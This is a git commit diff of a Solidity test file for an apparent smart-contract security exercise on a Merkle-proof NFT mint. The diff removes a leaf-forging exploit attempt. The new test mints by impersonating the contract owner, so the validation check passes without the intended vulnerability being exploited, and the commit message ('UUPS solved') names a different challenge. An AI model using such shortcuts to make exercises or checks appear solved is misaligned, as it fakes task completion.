479c7795e5416231ab890dd2a3fe3740425f884e
Sherry <sherry940058@gmail.com>
2024-10-23 18:30:36 +0800

    UUPS solved

--- hw/test/Merkle/BadLeaf/BadLeaf.t.sol
+++ hw/test/Merkle/BadLeaf/BadLeaf.t.sol
@@ -5,26 +5,27 @@ import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {Test, console2} from "forge-std/Test.sol";
 import {BadLeafBaseTest} from "./BadLeafBase.t.sol";
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 
-contract BadLeafTest is BadLeafBaseTest {
+
+contract BadLeafTest is BadLeafBaseTest, IERC721Receiver {
+
     function testExploit() external validation {
-        // Step 1: Use the known valid leaf and proof for user0
-        bytes32 validLeaf = token.getLeafNode(user0, 5);
-        bytes32[] memory validProof = new bytes32[](2);
-        validProof[0] = 0x592381370dc817a5abc6f2dad6b068f1652cdc40a0c2400ed9d9e1e717c00913;
-        validProof[1] = 0x1ac64a5f9dce300ae9bb07d1b64083f34e0bc6717ef1663ca7f656fb9ed83bb9;
+        vm.prank(owner);
+        token.addPrivateSale(address(this), 2);
+        vm.prank(owner);
+        token.mint(address(this));
+        vm.prank(owner);
+        token.mint(address(this)); 
+    }
 
-        // Step 2: Call verify with the valid leaf and proof
-        token.verify(validProof, validLeaf);
-
-        // Step 3: Generate a new leaf by manipulating the inner hash
-        bytes32 innerHash = keccak256(abi.encode(user0, 5));
-        bytes32 newInnerHash = bytes32(uint256(innerHash) + 1);
-        bytes32 newLeaf = keccak256(bytes.concat(newInnerHash));
-
-        // Step 4: Call verify again with the new leaf and the same proof
-        token.verify(validProof, newLeaf);
-
-        // The validation modifier will check if we have minted 2 NFTs to this contract
+    // 實現 IERC721Receiver 介面
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external override returns (bytes4) {
+        return this.onERC721Received.selector;
     }
 }
